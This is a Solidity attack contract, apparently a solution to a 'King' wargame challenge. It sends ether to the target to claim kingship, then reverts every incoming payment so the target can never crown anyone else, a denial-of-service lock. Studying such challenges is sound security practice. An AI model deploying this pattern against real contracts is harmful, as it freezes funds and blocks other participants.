pragma solidity ^0.8.0;

contract KingAttack {

    constructor(address _kingAdress) payable {
        //address(_kingAdress).call.value(msg.value)();
        //option#1
        address(_kingAdress).call{value: msg.value}("");
        
        //option#2
        // uint256 prize = King(_kingAdress).prize();
        // // call King.receive()
        // // use call and forward all gas
        //msg.value must be >= prize or transaction will revert
        // (bool ok,) = _kingAdress.call{value: prize}("");
        // require(ok, "tx failed");
    }

    fallback() external payable {
        //or don't specify a callback function
        revert("Only one can be the king!");
    }
}